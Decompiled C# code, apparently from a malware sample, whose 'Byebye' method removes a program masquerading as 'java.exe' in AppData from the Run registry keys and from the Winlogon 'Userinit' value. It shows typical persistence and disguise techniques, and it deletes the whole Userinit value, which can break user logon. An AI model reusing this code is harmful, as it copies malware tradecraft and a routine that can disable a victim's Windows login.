using System;
using System.Diagnostics;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace WindowsApplication1;

internal class Uninstall
{
	[DebuggerNonUserCode]
	public Uninstall()
	{
	}

	public static void Byebye()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\java.exe\\java.exe.exe";
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (Operators.CompareString((string)registryKey.GetValue("java.exe"), text, false) == 0)
			{
				registryKey.DeleteValue("java.exe", throwOnMissingValue: true);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Environment.Exit(0);
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (Operators.CompareString((string)registryKey.GetValue("java.exe"), text, false) == 0)
			{
				registryKey.DeleteValue("java.exe", throwOnMissingValue: true);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			Environment.Exit(0);
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true);
			string text2 = registryKey.GetValue("Userinit")!.ToString();
			if (text2.Contains(text))
			{
				registryKey.DeleteValue("Userinit", throwOnMissingValue: true);
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			Environment.Exit(0);
			ProjectData.ClearProjectError();
		}
		Environment.Exit(0);
	}
}
